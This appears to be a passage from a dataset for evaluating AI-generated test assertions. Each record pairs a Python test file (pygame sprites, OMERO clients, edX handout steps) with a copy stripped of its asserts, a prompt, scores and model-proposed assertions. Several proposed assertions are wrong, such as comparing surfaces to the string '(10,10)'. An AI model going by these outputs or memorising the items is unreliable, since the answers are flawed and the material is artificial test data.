102        classifiers_list_diff_actions.update_set(0.2)
103        for c in classifiers_list_diff_actions:
104",6272,"[[11, 'cfg', '!=', None, ""cfg should not be None as it configures the rest of the functions""],
 [15, 'situation', '!=', None, ""situation should not be None as it represents a possible state from the environment""],
 [19, 'classifiers_list_diff_actions', '!=', None, ""classifiers_list_diff_actions should not be None as it helps the model learn""],
 [30, 'cond', '!=', None, ""cond should not be None because it represents the current condition""],
 [31, 'act', '>=', 0, ""act should be a non-negative number because it represents an action""],
 [36, 'cl', '!=', None, ""cl must not be None because it is a classifier that helps model learn""],
 [52, 'classifiers_list', '!=', None, ""classifiers_list should not be None because it represents all classifiers that helps the model learn""],
 [54, 'covering_cl', '!=', None, ""covering_cl must not be None because it is a classifier designed to fit the current situation""],
 [57, 'classifiers_list', '!=', None, ""classifiers_list should not be None because it represents all classifiers that helps the model learn""],
 [78, 'match_set', '!=', None, ""match_set should not be None because it contains the classifiers matching the current situation""],
 [81, 'action_set', '!=', None, ""action_set should not be None because it contains the classifiers suggesting the same action""],
 [82, 'action_set[0].action', '==', 1, ""action_set[0].action should be 1 as it was just updated to 1""],
 [91, 'classifiers_list_diff_actions[0].prediction', '!=', None, ""classifiers_list_diff_actions[0].prediction should not be None as it was just updated""],
 [92, 'prediction_array', '!=', None, ""prediction_array should not be None because it contains the up-to-date predictions of all actions""]]"
lily-mayfield/pygame-anisprite,"from __future__ import absolute_import
import os

import pygame

from pygame_anisprite import anisprite
# this isn't very law of demeter...
from .common import compare_surfaces


class MockClock(object):
    def get_time(self):
        return 1000


class TestAnimatedSprite(object):

    def test_gif_loading(self):
        testpath = os.path.realpath(__file__)
        path = os.path.abspath(os.path.join(testpath,
                                            "".."",
                                            ""resources"",
                                            ""animatedsprite.gif""))

        # Create our mock clock
        clock = MockClock()

        # Create the AnimatedSprite object from the test GIF file
        animsprite = anisprite.AnimatedSprite.from_gif(path)

        # Test getting the dimensions of the largest frame
        assert animsprite.largest_frame_size() == (10, 10)

        # Create surfaces to compare against
        frameone = pygame.surface.Surface((10, 10))
        frameone.fill((255, 0, 0))
        frametwo = pygame.surface.Surface((10, 10))
        frametwo.fill((0, 255, 0))

        # Blit the AnimatedSprite (which should give us our first frame)
        outputsurface = pygame.surface.Surface((10, 10))
        outputsurface.blit(animsprite.image, (0, 0))

        assert(compare_surfaces(outputsurface, frameone))

        timedelta = clock.get_time()
        animsprite.update(timedelta)

        # Blit again, which should give us our second frame
        outputsurface = pygame.surface.Surface((10, 10))
        outputsurface.blit(animsprite.image, (0, 0))

        assert(compare_surfaces(outputsurface, frametwo))

    def test_animation(self):
        # Create two surfaces with different colors
        frameone_surface = pygame.surface.Surface((10, 10))
        frameone_surface.fill((255, 0, 0))
        frametwo_surface = pygame.surface.Surface((10, 10))
        frametwo_surface.fill((0, 255, 0))

        # Create frames from these surfaces
        frameone = anisprite.Frame(frameone_surface, 0, 1000)
        frametwo = anisprite.Frame(frametwo_surface, 1000, 2000)

        assert (frameone.__repr__()
                == ""<Frame duration(1000) start_time(0) end_time(1000)>"")

        # Create a mock Clock object for the AnimatedSprite
        clock = MockClock()

        # Create the AnimatedSprite with our frames
        animsprite = anisprite.AnimatedSprite([frameone, frametwo])

        # Blit the AnimatedSprite (which should give us our first frame)
        outputsurface = pygame.surface.Surface((10, 10))
        outputsurface.blit(animsprite.image, (0, 0))

        assert(compare_surfaces(outputsurface, frameone_surface))

        # Update the AnimatedSprite
        animsprite.update(clock.get_time())

        # Blit again, which should give us our second frame
        outputsurface = pygame.surface.Surface((10, 10))
        outputsurface.blit(animsprite.image, (0, 0))

        assert(compare_surfaces(outputsurface, frametwo_surface))
","
1from __future__ import absolute_import
2import os
3
4import pygame
5
6from pygame_anisprite import anisprite
7# this isn't very law of demeter...
8from .common import compare_surfaces
9
10
11class MockClock(object):
12    def get_time(self):
13        return 1000
14
15
16class TestAnimatedSprite(object):
17
18    def test_gif_loading(self):
19        testpath = os.path.realpath(__file__)
20        path = os.path.abspath(os.path.join(testpath,
21                                            "".."",
22                                            ""resources"",
23                                            ""animatedsprite.gif""))
24
25        # Create our mock clock
26        clock = MockClock()
27
28        # Create the AnimatedSprite object from the test GIF file
29        animsprite = anisprite.AnimatedSprite.from_gif(path)
30
31        # Test getting the dimensions of the largest frame
32
33        # Create surfaces to compare against
34        frameone = pygame.surface.Surface((10, 10))
35        frameone.fill((255, 0, 0))
36        frametwo = pygame.surface.Surface((10, 10))
37        frametwo.fill((0, 255, 0))
38
39        # Blit the AnimatedSprite (which should give us our first frame)
40        outputsurface = pygame.surface.Surface((10, 10))
41        outputsurface.blit(animsprite.image, (0, 0))
42
43
44        timedelta = clock.get_time()
45        animsprite.update(timedelta)
46
47        # Blit again, which should give us our second frame
48        outputsurface = pygame.surface.Surface((10, 10))
49        outputsurface.blit(animsprite.image, (0, 0))
50
51
52    def test_animation(self):
53        # Create two surfaces with different colors
54        frameone_surface = pygame.surface.Surface((10, 10))
55        frameone_surface.fill((255, 0, 0))
56        frametwo_surface = pygame.surface.Surface((10, 10))
57        frametwo_surface.fill((0, 255, 0))
58
59        # Create frames from these surfaces
60        frameone = anisprite.Frame(frameone_surface, 0, 1000)
61        frametwo = anisprite.Frame(frametwo_surface, 1000, 2000)
62
63                == ""<Frame duration(1000) start_time(0) end_time(1000)>"")
64
65        # Create a mock Clock object for the AnimatedSprite
66        clock = MockClock()
67
68        # Create the AnimatedSprite with our frames
69        animsprite = anisprite.AnimatedSprite([frameone, frametwo])
70
71        # Blit the AnimatedSprite (which should give us our first frame)
72        outputsurface = pygame.surface.Surface((10, 10))
73        outputsurface.blit(animsprite.image, (0, 0))
74
75
76        # Update the AnimatedSprite
77        animsprite.update(clock.get_time())
78
79        # Blit again, which should give us our second frame
80        outputsurface = pygame.surface.Surface((10, 10))
81        outputsurface.blit(animsprite.image, (0, 0))
82
83","[['animsprite.largest_frame_size()', '==', '(10'], ['(frameone.__repr__()', '==', 'True']]",6,2,0.3333333333333333,0.000662471016893,"['testpath', 'path', 'clock', 'animsprite', 'frameone', 'frametwo', 'outputsurface', 'timedelta', 'frameone_surface', 'frametwo_surface']",10,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['testpath', 'path', 'clock', 'animsprite', 'frameone', 'frametwo', 'outputsurface', 'timedelta', 'frameone_surface', 'frametwo_surface']
*Code:

1from __future__ import absolute_import
2import os
3
4import pygame
5
6from pygame_anisprite import anisprite
7# this isn't very law of demeter...
8from .common import compare_surfaces
9
10
11class MockClock(object):
12    def get_time(self):
13        return 1000
14
15
16class TestAnimatedSprite(object):
17
18    def test_gif_loading(self):
19        testpath = os.path.realpath(__file__)
20        path = os.path.abspath(os.path.join(testpath,
21                                            "".."",
22                                            ""resources"",
23                                            ""animatedsprite.gif""))
24
25        # Create our mock clock
26        clock = MockClock()
27
28        # Create the AnimatedSprite object from the test GIF file
29        animsprite = anisprite.AnimatedSprite.from_gif(path)
30
31        # Test getting the dimensions of the largest frame
32
33        # Create surfaces to compare against
34        frameone = pygame.surface.Surface((10, 10))
35        frameone.fill((255, 0, 0))
36        frametwo = pygame.surface.Surface((10, 10))
37        frametwo.fill((0, 255, 0))
38
39        # Blit the AnimatedSprite (which should give us our first frame)
40        outputsurface = pygame.surface.Surface((10, 10))
41        outputsurface.blit(animsprite.image, (0, 0))
42
43
44        timedelta = clock.get_time()
45        animsprite.update(timedelta)
46
47        # Blit again, which should give us our second frame
48        outputsurface = pygame.surface.Surface((10, 10))
49        outputsurface.blit(animsprite.image, (0, 0))
50
51
52    def test_animation(self):
53        # Create two surfaces with different colors
54        frameone_surface = pygame.surface.Surface((10, 10))
55        frameone_surface.fill((255, 0, 0))
56        frametwo_surface = pygame.surface.Surface((10, 10))
57        frametwo_surface.fill((0, 255, 0))
58
59        # Create frames from these surfaces
60        frameone = anisprite.Frame(frameone_surface, 0, 1000)
61        frametwo = anisprite.Frame(frametwo_surface, 1000, 2000)
62
63                == ""<Frame duration(1000) start_time(0) end_time(1000)>"")
64
65        # Create a mock Clock object for the AnimatedSprite
66        clock = MockClock()
67
68        # Create the AnimatedSprite with our frames
69        animsprite = anisprite.AnimatedSprite([frameone, frametwo])
70
71        # Blit the AnimatedSprite (which should give us our first frame)
72        outputsurface = pygame.surface.Surface((10, 10))
73        outputsurface.blit(animsprite.image, (0, 0))
74
75
76        # Update the AnimatedSprite
77        animsprite.update(clock.get_time())
78
79        # Blit again, which should give us our second frame
80        outputsurface = pygame.surface.Surface((10, 10))
81        outputsurface.blit(animsprite.image, (0, 0))
82
83",4351,"[[19, 'testpath', '!=', '', 'Ensure testpath is successfully created'],
[24, 'path', '!=', '', 'Ensure path to the image file is correctly defined'],
[29, 'animsprite', '!=', '', 'Ensure AnimatedSprite object is created from the GIF file'],
[35, 'frameone', '==', '(10,10)', 'Assert the size of surface for frameone'],
[37, 'frametwo', '==', '(10,10)', 'Assert the size of surface for frametwo'],
[40, 'outputsurface', '==', '(10,10)', 'Assert the size of outputsurface'],
[48, 'outputsurface', '==', '(10,10)', 'Ensure the second outputsurface is created with same dimensions'],
[54, 'frameone_surface', '==', '(10,10)', 'Assert the size of surface for frameone_surface'],
[56, 'frametwo_surface', '==', '(10,10)', 'Assert the size of surface for frametwo_surface'],
[60, 'frameone', '!=', '', 'Ensure the Frame object is created for frameone'],
[61, 'frametwo', '!=', '', 'Ensure the Frame object is created for frametwo'],
[69, 'animsprite', '!=', '', 'Ensure animated sprites are created'],
[72, 'outputsurface', '==', '(10,10)', 'Assert the size of outputsurface'],
[80, 'outputsurface', '==', '(10,10)', 'Ensure the second outputsurface is created with same dimensions']]"
knabar/openmicroscopy,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# Copyright (C) 2010-2014 Glencoe Software, Inc. All Rights Reserved.
# Use is subject to license terms supplied in LICENSE.txt
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

""""""
   Tests for the demonstrating client usage

""""""

import omero
from omero.testlib import ITest

from omero.rtypes import rstring


class TestClientUsage(ITest):

    """"""
    Note: this is the only test which should use 'omero.client()'
    All others should use the new_client(user=) syntax from ITest
    """"""

    def testClientClosedAutomatically(self):
        client = omero.client()
        user = self.new_user()
        client.createSession(user.omeName.val, user.omeName.val)
        client.getSession().closeOnDestroy()

    def testClientClosedManually(self):
        client = omero.client()
        user = self.new_user()
        client.createSession(user.omeName.val, user.omeName.val)
        client.getSession().closeOnDestroy()
        client.closeSession()

    def testUseSharedMemory(self):
        client = omero.client()
        user = self.new_user()
        client.createSession(user.omeName.val, user.omeName.val)

        assert 0 == len(client.getInputKeys())
        client.setInput(""a"", rstring(""b""))
        assert 1 == len(client.getInputKeys())
        assert ""a"" in client.getInputKeys()
        assert ""b"" == client.getInput(""a"").getValue()

        client.closeSession()

    def testCreateInsecureClientTicket2099(self):
        secure = omero.client()
        assert secure.isSecure()
        try:
            user = self.new_user()
            s = secure.createSession(
                user.omeName.val, user.omeName.val)
            s.getAdminService().getEventContext()
            insecure = secure.createClient(False)
            try:
                insecure.getSession().getAdminService().getEventContext()
                assert not insecure.isSecure()
            finally:
                insecure.closeSession()
        finally:
            secure.closeSession()

    def testGetStatefulServices(self):
        root = self.root
        sf = root.sf
        sf.setSecurityContext(omero.model.ExperimenterGroupI(0, False))
        sf.createRenderingEngine()
        srvs = root.getStatefulServices()
        assert 1 == len(srvs)
        try:
            sf.setSecurityContext(omero.model.ExperimenterGroupI(1, False))
            assert False, ""Should not be allowed""
        except:
            pass  # good
        srvs[0].close()
        srvs = root.getStatefulServices()
        assert 0 == len(srvs)
        sf.setSecurityContext(omero.model.ExperimenterGroupI(1, False))
","
1#!/usr/bin/env python
2# -*- coding: utf-8 -*-
3
4#
5# Copyright (C) 2010-2014 Glencoe Software, Inc. All Rights Reserved.
6# Use is subject to license terms supplied in LICENSE.txt
7#
8# This program is free software; you can redistribute it and/or modify
9# it under the terms of the GNU General Public License as published by
10# the Free Software Foundation; either version 2 of the License, or
11# (at your option) any later version.
12#
13# This program is distributed in the hope that it will be useful,
14# but WITHOUT ANY WARRANTY; without even the implied warranty of
15# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
16# GNU General Public License for more details.
17#
18# You should have received a copy of the GNU General Public License along
19# with this program; if not, write to the Free Software Foundation, Inc.,
20# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
21
22""""""
23   Tests for the demonstrating client usage
24
25""""""
26
27import omero
28from omero.testlib import ITest
29
30from omero.rtypes import rstring
31
32
33class TestClientUsage(ITest):
34
35    """"""
36    Note: this is the only test which should use 'omero.client()'
37    All others should use the new_client(user=) syntax from ITest
38    """"""
39
40    def testClientClosedAutomatically(self):
41        client = omero.client()
42        user = self.new_user()
43        client.createSession(user.omeName.val, user.omeName.val)
44        client.getSession().closeOnDestroy()
45
46    def testClientClosedManually(self):
47        client = omero.client()
48        user = self.new_user()
49        client.createSession(user.omeName.val, user.omeName.val)
50        client.getSession().closeOnDestroy()
51        client.closeSession()
52
53    def testUseSharedMemory(self):
54        client = omero.client()
55        user = self.new_user()
56        client.createSession(user.omeName.val, user.omeName.val)
57
58        client.setInput(""a"", rstring(""b""))
59
60        client.closeSession()
61
62    def testCreateInsecureClientTicket2099(self):
63        secure = omero.client()
64        try:
65            user = self.new_user()
66            s = secure.createSession(
67                user.omeName.val, user.omeName.val)
68            s.getAdminService().getEventContext()
69            insecure = secure.createClient(False)
70            try:
71                insecure.getSession().getAdminService().getEventContext()
72            finally:
73                insecure.closeSession()
74        finally:
75            secure.closeSession()
76
77    def testGetStatefulServices(self):
78        root = self.root
79        sf = root.sf
80        sf.setSecurityContext(omero.model.ExperimenterGroupI(0, False))
81        sf.createRenderingEngine()
82        srvs = root.getStatefulServices()
83        try:
84            sf.setSecurityContext(omero.model.ExperimenterGroupI(1, False))
85        except:
86            pass  # good
87        srvs[0].close()
88        srvs = root.getStatefulServices()
89        sf.setSecurityContext(omero.model.ExperimenterGroupI(1, False))
90","[['0', '==', 'len(client.getInputKeys())'], ['1', '==', 'len(client.getInputKeys())'], ['""b""', '==', 'client.getInput(""a"").getValue()'], ['secure.isSecure()', '==', 'True'], ['insecure.isSecure()', '==', 'False'], ['1', '==', 'len(srvs)'], ['False', '==', 'True'], ['0', '==', 'len(srvs)']]",9,8,0.8888888888888888,0.0024176488365064,"['client', 'user', 'secure', 's', 'insecure', 'root', 'sf', 'srvs']",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['client', 'user', 'secure', 's', 'insecure', 'root', 'sf', 'srvs']
*Code:

1#!/usr/bin/env python
2# -*- coding: utf-8 -*-
3
4#
5# Copyright (C) 2010-2014 Glencoe Software, Inc. All Rights Reserved.
6# Use is subject to license terms supplied in LICENSE.txt
7#
8# This program is free software; you can redistribute it and/or modify
9# it under the terms of the GNU General Public License as published by
10# the Free Software Foundation; either version 2 of the License, or
11# (at your option) any later version.
12#
13# This program is distributed in the hope that it will be useful,
14# but WITHOUT ANY WARRANTY; without even the implied warranty of
15# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
16# GNU General Public License for more details.
17#
18# You should have received a copy of the GNU General Public License along
19# with this program; if not, write to the Free Software Foundation, Inc.,
20# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
21
22""""""
23   Tests for the demonstrating client usage
24
25""""""
26
27import omero
28from omero.testlib import ITest
29
30from omero.rtypes import rstring
31
32
33class TestClientUsage(ITest):
34
35    """"""
36    Note: this is the only test which should use 'omero.client()'
37    All others should use the new_client(user=) syntax from ITest
38    """"""
39
40    def testClientClosedAutomatically(self):
41        client = omero.client()
42        user = self.new_user()
43        client.createSession(user.omeName.val, user.omeName.val)
44        client.getSession().closeOnDestroy()
45
46    def testClientClosedManually(self):
47        client = omero.client()
48        user = self.new_user()
49        client.createSession(user.omeName.val, user.omeName.val)
50        client.getSession().closeOnDestroy()
51        client.closeSession()
52
53    def testUseSharedMemory(self):
54        client = omero.client()
55        user = self.new_user()
56        client.createSession(user.omeName.val, user.omeName.val)
57
58        client.setInput(""a"", rstring(""b""))
59
60        client.closeSession()
61
62    def testCreateInsecureClientTicket2099(self):
63        secure = omero.client()
64        try:
65            user = self.new_user()
66            s = secure.createSession(
67                user.omeName.val, user.omeName.val)
68            s.getAdminService().getEventContext()
69            insecure = secure.createClient(False)
70            try:
71                insecure.getSession().getAdminService().getEventContext()
72            finally:
73                insecure.closeSession()
74        finally:
75            secure.closeSession()
76
77    def testGetStatefulServices(self):
78        root = self.root
79        sf = root.sf
80        sf.setSecurityContext(omero.model.ExperimenterGroupI(0, False))
81        sf.createRenderingEngine()
82        srvs = root.getStatefulServices()
83        try:
84            sf.setSecurityContext(omero.model.ExperimenterGroupI(1, False))
85        except:
86            pass  # good
87        srvs[0].close()
88        srvs = root.getStatefulServices()
89        sf.setSecurityContext(omero.model.ExperimenterGroupI(1, False))
90",4546,"[[41, 'client', '!=', None, 'client should be initialized properly'],
[42, 'user', '!=', None, 'user should be initialized properly'],
[44, 'client', '!=', None, 'client session should not be closed prematurely'],
[47, 'client', '!=', None, 'client should be initialized properly'],
[48, 'user', '!=', None, 'user should be initialized properly'],
[50, 'client', '!=', None, 'client session should not be closed prematurely'],
[54, 'client', '!=', None, 'client should be initialized properly'],
[55, 'user', '!=', None, 'user should be initialized properly'],
[60, 'client', '!=', None, 'client session should not be closed prematurely'],
[63, 'secure', '!=', None, 'secure client should be initialized properly'],
[65, 'user', '!=', None, 'user should be initialized properly'],
[69, 'insecure', '!=', None, 'insecure client should be initialized properly'],
[73, 'insecure', '!=', None, 'insecure client session should not be closed prematurely'],
[78, 'root', '!=', None, 'root should be initialized properly'],
[79, 'sf', '!=', None, 'sf should be initialized properly'],
[82, 'srvs', '!=', None, 'srvs should be initialized properly']]"
amir-qayyum-khan/edx-platform,"# pylint: disable=missing-docstring

from cms.djangoapps.contentstore.features.common import type_in_codemirror, get_codemirror_value
from lettuce import world, step
from nose.tools import assert_in


@step(u'I go to the course updates page')
def go_to_updates(_step):
    menu_css = 'li.nav-course-courseware'
    updates_css = 'li.nav-course-courseware-updates a'
    world.css_click(menu_css)
    world.css_click(updates_css)
    world.wait_for_visible('#course-handouts-view')


@step(u'I change the handout from ""([^""]*)"" to ""([^""]*)""$')
def change_existing_handout(_step, before, after):
    verify_text_in_editor_and_update('div.course-handouts .edit-button', before, after)


@step(u'I modify the handout to ""([^""]*)""$')
def edit_handouts(_step, text):
    edit_css = 'div.course-handouts > .edit-button'
    world.css_click(edit_css)
    change_text(text)


@step(u'I see the handout ""([^""]*)""$')
def check_handout(_step, handout):
    handout_css = 'div.handouts-content'
    assert_in(handout, world.css_html(handout_css))


@step(u'I see the handout image link ""([^""]*)""$')
def check_handout_image_link(_step, image_file):
    handout_css = 'div.handouts-content'
    handout_html = world.css_html(handout_css)
    asset_key = world.scenario_dict['COURSE'].id.make_asset_key(asset_type='asset', path=image_file)
    assert_in(unicode(asset_key), handout_html)


@step(u'I see the handout error text')
def check_handout_error(_step):
    handout_error_css = 'div#handout_error'
    assert world.css_has_class(handout_error_css, 'is-shown')


@step(u'I see handout save button disabled')
def check_handout_error(_step):
    handout_save_button = 'form.edit-handouts-form .save-button'
    assert world.css_has_class(handout_save_button, 'is-disabled')


@step(u'I edit the handout to ""([^""]*)""$')
def edit_handouts(_step, text):
    type_in_codemirror(0, text)


@step(u'I see handout save button re-enabled')
def check_handout_error(_step):
    handout_save_button = 'form.edit-handouts-form .save-button'
    assert not world.css_has_class(handout_save_button, 'is-disabled')


@step(u'I save handout edit')
def check_handout_error(_step):
    save_css = '.save-button'
    world.css_click(save_css)


def change_text(text):
    type_in_codemirror(0, text)
    save_css = '.save-button'
    world.css_click(save_css)


def verify_text_in_editor_and_update(button_css, before, after):
    world.css_click(button_css)
    text = get_codemirror_value()
    assert_in(before, text)
    change_text(after)


@step('I see a ""(saving|deleting)"" notification')
def i_see_a_mini_notification(_step, _type):
    saving_css = '.wrapper-notification-mini'
    assert world.is_css_present(saving_css)
","
1# pylint: disable=missing-docstring
2
3from cms.djangoapps.contentstore.features.common import type_in_codemirror, get_codemirror_value
4from lettuce import world, step
5
6
7@step(u'I go to the course updates page')
8def go_to_updates(_step):
9    menu_css = 'li.nav-course-courseware'
10    updates_css = 'li.nav-course-courseware-updates a'
11    world.css_click(menu_css)
12    world.css_click(updates_css)
13    world.wait_for_visible('#course-handouts-view')
14
15
16@step(u'I change the handout from ""([^""]*)"" to ""([^""]*)""$')
17def change_existing_handout(_step, before, after):
18    verify_text_in_editor_and_update('div.course-handouts .edit-button', before, after)
19
20
21@step(u'I modify the handout to ""([^""]*)""$')
22def edit_handouts(_step, text):
23    edit_css = 'div.course-handouts > .edit-button'
24    world.css_click(edit_css)
25    change_text(text)
26
27
28@step(u'I see the handout ""([^""]*)""$')
29def check_handout(_step, handout):
30    handout_css = 'div.handouts-content'
31
32
33@step(u'I see the handout image link ""([^""]*)""$')
34def check_handout_image_link(_step, image_file):
35    handout_css = 'div.handouts-content'
36    handout_html = world.css_html(handout_css)
37    asset_key = world.scenario_dict['COURSE'].id.make_asset_key(asset_type='asset', path=image_file)
38
39
40@step(u'I see the handout error text')
41def check_handout_error(_step):
42    handout_error_css = 'div#handout_error'
43
44
45@step(u'I see handout save button disabled')
46def check_handout_error(_step):
47    handout_save_button = 'form.edit-handouts-form .save-button'
48
49
50@step(u'I edit the handout to ""([^""]*)""$')
51def edit_handouts(_step, text):
52    type_in_codemirror(0, text)
53
54
55@step(u'I see handout save button re-enabled')
56def check_handout_error(_step):
57    handout_save_button = 'form.edit-handouts-form .save-button'
58
59
60@step(u'I save handout edit')
61def check_handout_error(_step):
62    save_css = '.save-button'
63    world.css_click(save_css)
64
65
66def change_text(text):
67    type_in_codemirror(0, text)
68    save_css = '.save-button'
69    world.css_click(save_css)
70
71
72def verify_text_in_editor_and_update(button_css, before, after):
73    world.css_click(button_css)
74    text = get_codemirror_value()
75    change_text(after)
76
77
78@step('I see a ""(saving|deleting)"" notification')
79def i_see_a_mini_notification(_step, _type):
80    saving_css = '.wrapper-notification-mini'
81","[['out', '==', 'True'], ['out_css))', '==', 'True'], ['out_html)', '==', 'True'], ['world.css_has_class(h', '==', 'True'], ['out_error_css', '==', 'True'], ['world.css_has_class(h', '==', 'True'], ['out_save_button', '==', 'True'], ['world.css_has_class(h', '==', 'False'], ['out_save_button', '==', 'True'], ['world.is_css_present(saving_css)', '==', 'True']]",8,10,1.25,0.0037037037037037,"['_step', 'menu_css', 'updates_css', 'before', 'after', 'text', 'edit_css', 'handout', 'handout_css', 'image_file', 'handout_html', 'asset_key', 'handout_error_css', 'handout_save_button', 'save_css', 'button_css', '_type', 'saving_css']",18,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['_step', 'menu_css', 'updates_css', 'before', 'after', 'text', 'edit_css', 'handout', 'handout_css', 'image_file', 'handout_html', 'asset_key', 'handout_error_css', 'handout_save_button', 'save_css', 'button_css', '_type', 'saving_css']
*Code:

1# pylint: disable=missing-docstring
2
3from cms.djangoapps.contentstore.features.common import type_in_codemirror, get_codemirror_value
4from lettuce import world, step
5
6
7@step(u'I go to the course updates page')
8def go_to_updates(_step):
9    menu_css = 'li.nav-course-courseware'
10    updates_css = 'li.nav-course-courseware-updates a'
11    world.css_click(menu_css)
12    world.css_click(updates_css)
13    world.wait_for_visible('#course-handouts-view')
14
15
16@step(u'I change the handout from ""([^""]*)"" to ""([^""]*)""$')
17def change_existing_handout(_step, before, after):
18    verify_text_in_editor_and_update('div.course-handouts .edit-button', before, after)
19
20
21@step(u'I modify the handout to ""([^""]*)""$')
22def edit_handouts(_step, text):
23    edit_css = 'div.course-handouts > .edit-button'
24    world.css_click(edit_css)
25    change_text(text)
26
27
28@step(u'I see the handout ""([^""]*)""$')
29def check_handout(_step, handout):
30    handout_css = 'div.handouts-content'
31
32
33@step(u'I see the handout image link ""([^""]*)""$')
34def check_handout_image_link(_step, image_file):
35    handout_css = 'div.handouts-content'
36    handout_html = world.css_html(handout_css)
37    asset_key = world.scenario_dict['COURSE'].id.make_asset_key(asset_type='asset', path=image_file)
38
39
40@step(u'I see the handout error text')
41def check_handout_error(_step):
42    handout_error_css = 'div#handout_error'
43
44
45@step(u'I see handout save button disabled')
46def check_handout_error(_step):
47    handout_save_button = 'form.edit-handouts-form .save-button'
48
49
50@step(u'I edit the handout to ""([^""]*)""$')
51def edit_handouts(_step, text):
52    type_in_codemirror(0, text)
53
54
55@step(u'I see handout save button re-enabled')
56def check_handout_error(_step):
57    handout_save_button = 'form.edit-handouts-form .save-button'
58
59
60@step(u'I save handout edit')
61def check_handout_error(_step):
62    save_css = '.save-button'
63    world.css_click(save_css)
64
65
66def change_text(text):
67    type_in_codemirror(0, text)
68    save_css = '.save-button'
69    world.css_click(save_css)
70
71
72def verify_text_in_editor_and_update(button_css, before, after):
73    world.css_click(button_css)
74    text = get_codemirror_value()
75    change_text(after)
76
77
78@step('I see a ""(saving|deleting)"" notification')
79def i_see_a_mini_notification(_step, _type):
80    saving_css = '.wrapper-notification-mini'
81",4066,"[[8, '_step', '!=', None, 'The function requires a step argument'],
 [17, '_step', '!=', None, 'The function requires a step argument'],
 [17, 'before', '!=', None, 'The function requires a before text argument'],
 [17, 'after', '!=', None, 'The function requires a after text argument'],
 [22, '_step', '!=', None, 'The function requires a step argument'],
 [22, 'text', '!=', None, 'The function requires a text argument'],
 [29, '_step', '!=', None, 'The function requires a step argument'],
 [29, 'handout', '!=', None, 'The function requires a handout argument'],
 [34, '_step', '!=', None, 'The function requires a step argument'],
 [34, 'image_file', '!=', None, 'The function requires an image_file argument'],
 [41, '_step', '!=', None, 'The function requires a step argument'],
 [46, '_step', '!=', None, 'The function requires a step argument'],
 [51, '_step', '!=', None, 'The function requires a step argument'],
 [51, 'text', '!=', None, 'The function requires a text argument'],
 [56, '_step', '!=', None, 'The function requires a step argument'],
 [61, '_step', '!=', None, 'The function requires a step argument'],
 [66, 'text', '!=', None, 'The function requires a text argument'],
 [72, 'button_css', '!=', None, 'The function requires a button_css argument'],
 [72, 'before', '!=', None, 'The function requires a before text argument'],
 [72, 'after', '!=', None, 'The function requires a after text argument'],
 [79, '_step', '!=', None, 'The function requires a step argument'],
 [79, '_type', '!=', None, 'The function requires a type argument']]"
wagnerand/olympia,"from unittest import TestCase

import mock
import pytest

from olympia.accounts import verify


class TestProfile(TestCase):

    def setUp(self):
